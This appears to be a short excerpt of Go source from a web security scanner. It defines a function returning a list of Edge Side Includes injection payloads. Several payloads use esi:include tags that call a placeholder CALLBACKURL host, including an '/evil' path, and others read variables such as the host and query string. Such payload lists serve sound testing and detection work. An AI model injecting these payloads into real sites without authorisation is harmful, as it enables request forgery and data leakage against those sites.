...
func getESIIPayload() []string {
	payload := []string{
		...
		"<esi:include src=\"/CALLBACKURL\"/>",
		"<esi:include src=\"http://CALLBACKURL/evil\"/>",
		...
		"<esi:choose><esi:when test=\"$(HTTP_USER_AGENT{'Mozilla'})\"><esi:include src=\"/CALLBACKURL\"/></esi:when></esi:choose>",
		"<esi:vars name=\"$(HTTP_HOST)\"/>",
		"<esi:vars name=\"$(QUERY_STRING)\"/>",
		"<esi:assign name=\"x\" value=\"1\"><esi:choose><esi:when test=\"$(x)\"><esi:include src=\"http://CALLBACKURL/evil\"/></esi:when></esi:choose>",
		"<esi:remove><esi:include src=\"/CALLBACKURL\"/></esi:remove>",
	}
	return payload
}
